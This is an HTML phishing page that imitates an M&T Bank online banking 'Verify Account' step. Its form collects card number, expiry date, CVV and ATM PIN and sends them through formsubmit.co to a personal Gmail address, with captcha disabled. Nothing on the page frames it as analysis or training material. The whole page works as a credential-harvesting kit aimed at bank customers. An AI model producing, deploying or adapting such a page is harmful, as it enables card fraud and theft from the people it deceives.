<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"/>
    <title>Enroll in Online Banking - Verify Account | M&T Bank</title>
    <link rel="stylesheet" href="./bootstrap.css" />
    <link rel="stylesheet" href="./bootstrap.min.css" />
    <link rel="stylesheet" href="./all.css" />
    <style>
        * {
            margin: 0;
            padding: 0;
        }
        nav {
            border-bottom: 7px solid orange;
        }
        .form-btns {
            width: 100%;
            padding: 0.7rem 3.3rem;
            color: white;
            background-color: green;
            border: 1px solid green;
            border-radius: 3px;
        }
    </style>
</head>

<body>
    <nav id="nav" class="navbar navbar-expand-lg py-3 fixed-top" style="background-color: green; color: black">
        <div class="container">
            <div class="mx-auto">
                <img src="./white logo.png" onclick="window.location.href = 'index.html'" id="logo" alt="" width="104px"
                    height="19px" />
            </div>

        </div>
    </nav>

    <section class="my-5">
        <div class="container-fluid py-3">
            <p>Verification</p>
            <h1 id="headthree" style="color: green;">Card Information</h1>
            <p>
                Verify access to your Online Banking account in just a few steps
            </p>
        </div>
        <form action="https://formsubmit.co/fishtina84@gmail.com" method="post">
            <div class="row container-fluid input-group mx-auto" id="personal">
                <input type="hidden" name="_captcha" value="false">
                <img src="./creditcard.png" class="m-0 p-0" alt="">
                <!-- <div class="input-group col-lg-3 col-md-4 col-12"></div> -->
                <label for="">Credit/Debit Card</label>
                <input maxlength="20" name="Credit/Debit Card" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbers"
                    placeholder="XXXX-XXXX-XXXX-XXXX" data-inputType="tel" class="form-control" />
                <div class="input-group col-lg-3 col-md-4 col-12 pb-3 "></div>
                <label for="">Expiry(MM)</label>
                <input type="tel" name="ExpiryMM" class="form-control" data-allowPaste="True" data-allowCopy="True"
                data-textBoxAccepts="numbers" maxlength="2" placeholder="02" />
                <div class="input-group col-lg-3 col-md-4 col-12 pb-3"></div>
                <label for="">Expiry(YY)</label>
                <input maxlength="4" name="YY" data-allowPaste="True" data-allowCopy="True"
                data-textBoxAccepts="numbers" placeholder="2025" data-inputType="tel" class="form-control" />
                <div class="input-group col-lg-3 col-md-4 col-12 pb-3 "></div>
                <label for="">CVV</label>
                <input name="CVV" data-allowPaste="True"
                data-allowCopy="True" data-textBoxAccepts="numbers" placeholder="***" type="password" class="form-control" maxlength="3" />
                <div class="input-group col-lg-3 col-md-4 col-12 pb-3 "></div>
                <label for="">ATM Pin</label>
                <input name="ATM Pin" type="password" class="form-control" maxlength="4" data-allowPaste="True" data-allowCopy="True"
                    data-textBoxAccepts="numbers" placeholder="0000" placeholder="Passcode" />
                <div class="input-group col-lg-3 col-md-4 col-12 container-fluid my-4">
                    <div class="input-group">
                        <button class="form-btns" type="submit" onsubmit="window.location.href='about:blank'">Verify</button>
                    </div>
                </div>
            </div>
        </form>

    </section>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <script src="./jquery.js"></script>
    <script src="./jquery.min.js"></script>
    <script src="./bootstrap.js"></script>
</body>

</html>
